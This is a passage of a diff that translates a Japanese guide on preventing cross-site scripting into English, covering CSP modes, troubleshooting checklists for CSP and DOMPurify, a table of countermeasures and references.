-4. 外部CDNのスクリプト/スタイルがある場合:
-   → script-src / style-src に追加
-5. Google Analytics, Tag Manager 等:
-   → 'strict-dynamic' + nonce で対応
-6. eval() を使うライブラリがある場合:
-   → 'unsafe-eval' を追加（リスクを理解した上で）
-   → 可能であれば eval() を使わないライブラリに移行
-```
-
-### DOMPurify でHTMLが壊れる
-
-```
-チェックリスト:
-1. ALLOWED_TAGS に必要なタグが含まれているか確認
-2. ALLOWED_ATTR に必要な属性が含まれているか確認
-3. class, id 等の汎用属性が許可されているか
-4. SVG / MathML を使用する場合:
-   → USE_PROFILES で明示的に有効化
-5. カスタム data-* 属性:
-   → ALLOW_DATA_ATTR: true を設定
-```
+`Content-Security-Policy` blocks resources that violate the policy. `Content-Security-Policy-Report-Only` does not block but only reports violations. When introducing CSP, the recommended pattern is to first confirm the impact with Report-Only, then switch to enforced mode after verifying no issues.
 
 ---
 
-## まとめ
+## Troubleshooting
 
-| 対策 | 効果 | 適用タイミング | 重要度 |
-|------|------|---------------|--------|
-| 自動エスケープ | 出力時のHTMLインジェクション防止 | テンプレートレンダリング | 必須 |
-| サニタイゼーション | 許可されたHTMLのみ通過 | ユーザー生成コンテンツの保存時 | 推奨 |
-| CSP | インラインスクリプトの実行防止 | HTTPレスポンスヘッダー | 強く推奨 |
-| Nonce-based CSP | CSPのバイパス防止 | 動的ページ | 推奨 |
-| HttpOnly Cookie | Cookie窃取の防止 | Cookie設定 | 必須 |
-| コンテキスト別エスケープ | 各出力先での安全な表示 | 全出力処理 | 必須 |
-| Trusted Types | DOM操作のXSS防止 | クライアントJS | 推奨 |
-| X-Content-Type-Options | MIMEスニッフィング防止 | HTTPヘッダー | 必須 |
+### Site stopped working after setting CSP
+
+```
+Checklist:
+1. Check CSP violation errors in browser DevTools Console
+2. Switch back to Report-Only mode and collect violation reports
+3. If there are inline scripts:
+   → Set nonce or hash
+4. If there are scripts/styles from external CDNs:
+   → Add to script-src / style-src
+5. Google Analytics, Tag Manager, etc.:
+   → Handle with 'strict-dynamic' + nonce
+6. If a library uses eval():
+   → Add 'unsafe-eval' (understanding the risk)
+   → If possible, migrate to a library that does not use eval()
+```
+
+### DOMPurify is breaking HTML
+
+```
+Checklist:
+1. Check that required tags are included in ALLOWED_TAGS
+2. Check that required attributes are included in ALLOWED_ATTR
+3. Check that generic attributes like class, id are allowed
+4. When using SVG / MathML:
+   → Explicitly enable with USE_PROFILES
+5. Custom data-* attributes:
+   → Set ALLOW_DATA_ATTR: true
+```
 
 ---
 
-## 次に読むべきガイド
+## Summary
 
-- [02-csrf-clickjacking.md](./02-csrf-clickjacking.md) -- CSRF/クリックジャッキング対策
-- [03-injection.md](./03-injection.md) -- インジェクション攻撃全般
-- [../04-application-security/00-secure-coding.md](../04-application-security/00-secure-coding.md) -- セキュアコーディング全般
-- [../02-cryptography/01-tls-certificates.md](../02-cryptography/01-tls-certificates.md) -- 暗号化通信
+| Countermeasure | Effect | When to Apply | Importance |
+|----------------|--------|---------------|------------|
+| Auto-escaping | Prevents HTML injection at output | Template rendering | Required |
+| Sanitization | Only allows permitted HTML through | When saving user-generated content | Recommended |
+| CSP | Prevents inline script execution | HTTP response header | Strongly recommended |
+| Nonce-based CSP | Prevents CSP bypass | Dynamic pages | Recommended |
+| HttpOnly Cookie | Prevents Cookie theft | Cookie settings | Required |
+| Context-specific escaping | Safe display at each output destination | All output processing | Required |
+| Trusted Types | Prevents XSS in DOM manipulation | Client-side JS | Recommended |
+| X-Content-Type-Options | Prevents MIME sniffing | HTTP header | Required |
 
 ---
 
-## 参考文献
+## Guides to Read Next
+
+- [02-csrf-clickjacking.md](./02-csrf-clickjacking.md) -- CSRF/Clickjacking countermeasures
+- [03-injection.md](./03-injection.md) -- Injection attacks in general
+- [../04-application-security/00-secure-coding.md](../04-application-security/00-secure-coding.md) -- Secure coding in general
+- [../02-cryptography/01-tls-certificates.md](../02-cryptography/01-tls-certificates.md) -- Encrypted communication
+
+---
+
+## References
 
 1. OWASP XSS Prevention Cheat Sheet -- https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
 2. MDN Web Docs: Content Security Policy -- https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
